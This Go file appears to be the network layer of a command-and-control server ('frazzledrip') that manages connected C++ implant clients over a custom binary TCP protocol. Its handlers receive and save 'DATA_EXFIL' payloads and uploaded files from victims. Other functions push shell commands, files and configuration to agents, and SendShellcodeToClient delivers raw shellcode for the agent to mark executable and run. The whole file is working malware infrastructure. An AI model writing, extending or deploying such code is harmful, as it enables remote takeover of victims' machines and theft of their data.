package network

import (
	"encoding/binary"
	"fmt"
	"github.com/Connduit/frazzledrip/server/backend/models"
	"github.com/Connduit/frazzledrip/server/backend/utils"
	"io"
	"log"
	"time"
)

/*
handleClientConnection manages a single connected client.

This goroutine runs for the lifetime of the TCP connection.

Duties:
- Continuously read incoming binary messages
- Enforce 60-second read timeout (disconnect dead clients)
- Parse incoming messages into InternalMessage structs
- Forward parsed messages to processClientMessage()
- Update LastSeen timestamp
- Remove client and cleanup on disconnect
*/

// TODO: this handles incoming data from client
func handleClientConnection(client *models.Client) {
	clientsMutex.Lock()
	conn := client.Conn
	clientsMutex.Unlock()
	if conn == nil {
		return
	}
	defer func() {
		conn.Close()
		DisconnectClient(client)
		log.Printf("Client disconnected: %s", client.ID)
	}()

	for {
		// Prevent dead clients from hanging forever.
		/*
			TODO: add my own custom code on how i want to handle timeouts.
			heartbeat messages should prevent deadline from ever being reached?
			Or if deadline is reached, send a "sleep/hibernate" message to the client that
			also tells it when to wakeup?
		*/
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))

		message, err := readBinaryMessage(conn)
		if err != nil {
			log.Printf("Read message from client %s: %v", client.ID, err)
			return
		}
		processClientMessage(client, message)
	}
}

// Bound allocations for untrusted frame lengths. This matches the HTTP upload limit.
const maxMessageDataSize = 32 << 20

// TCP is a byte stream: read exactly one header and its declared payload,
// preserving the next frame for the next call. A truncated frame ends the
// connection rather than interpreting its remaining payload as a new header.
func readBinaryMessage(reader io.Reader) (*models.InternalMessage, error) {
	var header [12]byte
	if _, err := io.ReadFull(reader, header[:]); err != nil {
		return nil, fmt.Errorf("read header: %w", err)
	}
	msg := &models.InternalMessage{Header: models.MessageHeader{
		MessageType: binary.LittleEndian.Uint32(header[0:4]),
		DataSize:    binary.LittleEndian.Uint32(header[4:8]),
		MessageID:   binary.LittleEndian.Uint32(header[8:12]),
	}}
	if msg.Header.DataSize > maxMessageDataSize {
		return nil, fmt.Errorf("message payload exceeds %d bytes", maxMessageDataSize)
	}
	if msg.Header.DataSize > 0 {
		msg.Data = make([]byte, int(msg.Header.DataSize))
		if _, err := io.ReadFull(reader, msg.Data); err != nil {
			return nil, fmt.Errorf("read payload: %w", err)
		}
	}
	return msg, nil
}

/*
processClientMessage handles ALL incoming messages from C++ clients.

Responsibilities:
- Convert raw binary message → human-readable ClientMessage
- Route message types to correct logic (sysinfo, upload file, error report, etc.)
- Persist messages in Client.Messages (history)
- Execute server-side actions (save files, save exfil data)

This function is the "dispatcher" for all client→server communication.
*/
func processClientMessage(client *models.Client, msg *models.InternalMessage) {
	// Create readable log entry / history entry
	clientMessage := models.ClientMessage{
		Timestamp: time.Now(),
		MessageID: msg.Header.MessageID,
		DataSize:  len(msg.Data),
		Content:   string(msg.Data),
	}

	directoryResponse := finishDirectoryRequest(client, msg)

	// Route based on message type (must match C++ enums)
	switch msg.Header.MessageType {
	case models.MESSAGE_HANDSHAKE:
		clientMessage.Type = "HANDSHAKE"
		log.Printf("Handshake from client %s", client.ID)
		sendWelcomeMessage(client)

	case models.MESSAGE_HEARTBEAT:
		clientMessage.Type = "HEARTBEAT"
		log.Printf("Heartbeat from client %s", client.ID)

	case models.MESSAGE_SYS_INFO:
		clientMessage.Type = "SYS_INFO"
		log.Printf("System info from client %s: %d bytes", client.ID, len(msg.Data))

	case models.MESSAGE_COMMAND_RESULT:
		clientMessage.Type = "COMMAND_RESULT"
		log.Printf("Command result from client %s (ID: %d):\n%s",
			client.ID, msg.Header.MessageID, string(msg.Data))
	/* TODO: add a specific one of these for stuff like systeminfo?
	case models.MESSAGE_COMMAND_RESULT:
		clientMessage.Type = "COMMAND_RESULT"
		log.Printf("Command result from client %s (ID: %d):\n%s",
			client.ID, msg.Header.MessageID, string(msg.Data))
	*/

	case models.MESSAGE_DATA_EXFIL:
		clientMessage.Type = "DATA_EXFIL"
		log.Printf("Data exfiltration from client %s: %d bytes", client.ID, len(msg.Data))
		utils.SaveExfilData(client.ID, msg.Data)

	case models.MESSAGE_UPLOAD_FILE:
		clientMessage.Type = "FILE_UPLOAD"
		log.Printf("File upload from client %s: %d bytes", client.ID, len(msg.Data))
		utils.SaveUploadedFile(client.ID, msg.Data)

	case models.MESSAGE_DIRECTORY_LISTING:
		clientMessage.Type = "DIRECTORY_LISTING"
		clientMessage.Content = "Directory listing received"
	case models.MESSAGE_ERROR_REPORT:
		clientMessage.Type = "ERROR_REPORT"
		log.Printf("Error report from client %s: %s", client.ID, string(msg.Data))
	}

	// TODO: maybe only add messages to the buffer if they are a certain msg.Header.MessageType?

	// Append to client's message history (max 100)
	if directoryResponse && msg.Header.MessageType != models.MESSAGE_ERROR_REPORT {
		clientMessage.Type = "DIRECTORY_LISTING"
		clientMessage.Content = "Directory listing received"
	}
	advanceBasicInfo := false
	clientsMutex.Lock()
	if !directoryResponse && (msg.Header.MessageType == models.MESSAGE_COMMAND_RESULT || msg.Header.MessageType == models.MESSAGE_ERROR_REPORT) {
		if pending, ok := pendingCommands[client.IPAddress]; ok && clients[client.IPAddress] == client && (msg.Header.MessageID == pending.ID || msg.Header.MessageID == 105) {
			if msg.Header.MessageType == models.MESSAGE_COMMAND_RESULT {
				client.SystemInfo = mergeCommandInfo(client.SystemInfo, pending.Command, string(msg.Data))
			}
			advanceBasicInfo = pending.Automatic || client.BasicInfoStatus == "collecting"
			storeCommandResult(client, pending.Command, string(msg.Data), clientMessage.Timestamp)
			delete(pendingCommands, client.IPAddress)
		}
	}
	if msg.Header.MessageType == models.MESSAGE_SYS_INFO || msg.Header.MessageType == models.MESSAGE_COMMAND_RESULT {
		client.SystemInfo = mergeSystemInfo(client.SystemInfo, msg.Data, msg.Header.MessageType == models.MESSAGE_COMMAND_RESULT)
	}
	client.LastSeen = clientMessage.Timestamp
	client.Messages = append(client.Messages, clientMessage)
	if len(client.Messages) > 100 {
		client.Messages = client.Messages[1:] // Drop oldest
	}
	clientsMutex.Unlock()
	if advanceBasicInfo {
		sendNextBasicInfo(client)
	}
}

/*
sendBinaryMessage writes a fully constructed InternalMessage
to the client over TCP.

This is the ONLY function that performs the actual network write.
*/
func sendBinaryMessage(client *models.Client, msg models.InternalMessage) error {
	clientsMutex.Lock()
	conn, active := client.Conn, client.IsActive
	browsing := directoryRequests[client.IPAddress]
	expectedType := uint32(models.MESSAGE_LIST_DIRECTORY)
	if browsing != nil && browsing.ViaDir {
		expectedType = models.MESSAGE_EXECUTE_COMMAND
	}
	if browsing != nil && (msg.Header.MessageType != expectedType || msg.Header.MessageID != browsing.ID) {
		clientsMutex.Unlock()
		return fmt.Errorf("a directory request is pending for this session")
	}
	clientsMutex.Unlock()
	if conn == nil || !active {
		return fmt.Errorf("session is offline")
	}
	data := serializeBinaryMessage(msg)
	// data := encodeBinaryMessage(msg)
	// data := encryptBinaryMessage(msg)
	_, err := conn.Write(data)
	return err
}

/*
serializeBinaryMessage converts an InternalMessage struct
into the binary protocol format expected by the client.

Header = 12 bytes
Data   = variable length
*/
func serializeBinaryMessage(msg models.InternalMessage) []byte {
	data := make([]byte, 12+len(msg.Data))

	binary.LittleEndian.PutUint32(data[0:4], msg.Header.MessageType)
	binary.LittleEndian.PutUint32(data[4:8], msg.Header.DataSize)
	binary.LittleEndian.PutUint32(data[8:12], msg.Header.MessageID)

	if len(msg.Data) > 0 {
		copy(data[12:], msg.Data)
	}

	return data
}

/*
sendWelcomeMessage is automatically sent after a client handshake.

Purpose: confirm protocol connection and message formatting.
*/
func sendWelcomeMessage(client *models.Client) {
	welcome := models.InternalMessage{
		Header: models.MessageHeader{
			MessageType: models.MESSAGE_HANDSHAKE,
			MessageID:   utils.GenerateMessageID(),
			DataSize:    0,
		},
	}
	sendBinaryMessage(client, welcome)
}

//
// ========================
//     SERVER → CLIENT OPS
// ========================
//

/*
SendCommandToClient sends a MESSAGE_EXECUTE_COMMAND.

This is ONLY for executing shell/console commands.
Not used for system info or specialized requests.

Data = UTF-8 command string.
*/
func SendCommandToClient(clientAddr string, command string) error {
	client, exists := GetClient(clientAddr)
	if !exists {
		return fmt.Errorf("client not connected")
	}

	msg := models.InternalMessage{
		Header: models.MessageHeader{
			MessageType: models.MESSAGE_EXECUTE_COMMAND,
			MessageID:   utils.GenerateMessageID(),
			DataSize:    uint32(len(command)),
		},
		Data: []byte(command),
	}
	clientsMutex.Lock()
	if current := clients[clientAddr]; current != nil && current.BasicInfoStatus == "collecting" {
		clientsMutex.Unlock()
		return fmt.Errorf("initial host information is being collected; wait for it to finish")
	}
	if _, browsing := directoryRequests[clientAddr]; browsing {
		clientsMutex.Unlock()
		return fmt.Errorf("a directory request is pending for this session")
	}
	if _, pending := pendingCommands[clientAddr]; pending {
		clientsMutex.Unlock()
		return fmt.Errorf("a shell command is already pending for this session; wait for its response")
	}
	pendingCommands[clientAddr] = pendingCommand{ID: msg.Header.MessageID, Command: command}
	clientsMutex.Unlock()

	if err := sendBinaryMessage(client, msg); err != nil {
		clientsMutex.Lock()
		if pendingCommands[clientAddr].ID == msg.Header.MessageID {
			delete(pendingCommands, clientAddr)
		}
		clientsMutex.Unlock()
		return err
	}

	log.Printf("Sent EXECUTE_COMMAND to client %s: %s", clientAddr, command)
	return nil
}

// TODO:
func SendMyCommandToClient(clientAddr string, command string) error {
	client, exists := GetClient(clientAddr)
	if !exists {
		return fmt.Errorf("client not connected")
	}

	msg := models.InternalMessage{
		Header: models.MessageHeader{
			//MessageType: models.MESSAGE_EXECUTE_COMMAND, // TODO: figure out a a way to not hard code this
			MessageType: models.MESSAGE_SYS_INFO, // TODO: hardcode for now
			MessageID:   utils.GenerateMessageID(),
			DataSize:    uint32(len(command)), // TODO: this doesn't matter for now but in the future maybe this can specify what system info we want (if not populated just give default)
		},
		Data: []byte(command),
	}

	if err := sendBinaryMessage(client, msg); err != nil {
		return err
	}

	log.Printf("Sent MY_EXECUTE_COMMAND to client %s: %s", clientAddr, command)
	return nil
}

/*
SendFileToClient sends a binary blob that the client should store as a file.

The C++ agent should interpret MESSAGE_DOWNLOAD_FILE as:
"save this file somewhere."
*/
func SendFileToClient(clientAddr string, fileData []byte) error {
	client, exists := GetClient(clientAddr)
	if !exists {
		return fmt.Errorf("client not connected")
	}

	msg := models.InternalMessage{
		Header: models.MessageHeader{
			MessageType: models.MESSAGE_DOWNLOAD_FILE,
			MessageID:   utils.GenerateMessageID(),
			DataSize:    uint32(len(fileData)),
		},
		Data: fileData,
	}

	if err := sendBinaryMessage(client, msg); err != nil {
		return err
	}

	log.Printf("Sent DOWNLOAD_FILE to client %s: %d bytes", clientAddr, len(fileData))
	return nil
}

/*
SendShellcodeToClient sends raw shellcode bytes that the client
should allocate, mark executable, and run.

This is the most dangerous and powerful message type.
*/
func SendShellcodeToClient(clientAddr string, shellcode []byte) error {
	client, exists := GetClient(clientAddr)
	if !exists {
		return fmt.Errorf("client not connected")
	}

	msg := models.InternalMessage{
		Header: models.MessageHeader{
			MessageType: models.MESSAGE_EXECUTE_SHELL_CODE,
			MessageID:   utils.GenerateMessageID(),
			DataSize:    uint32(len(shellcode)),
		},
		Data: shellcode,
	}

	if err := sendBinaryMessage(client, msg); err != nil {
		return err
	}

	log.Printf("Sent EXECUTE_SHELL_CODE to client %s: %d bytes", clientAddr, len(shellcode))
	return nil
}

/*
UpdateClientConfig sends configuration data to the client agent.

The agent decides what "config" means (poll rate, directory paths, modes, etc.)
*/
func UpdateClientConfig(clientAddr string, config string) error {
	client, exists := GetClient(clientAddr)
	if !exists {
		return fmt.Errorf("client not connected")
	}

	msg := models.InternalMessage{
		Header: models.MessageHeader{
			MessageType: models.MESSAGE_CONFIG_UPDATE,
			MessageID:   utils.GenerateMessageID(),
			DataSize:    uint32(len(config)),
		},
		Data: []byte(config),
	}

	if err := sendBinaryMessage(client, msg); err != nil {
		return err
	}

	log.Printf("Sent CONFIG_UPDATE to client %s", clientAddr)
	return nil
}
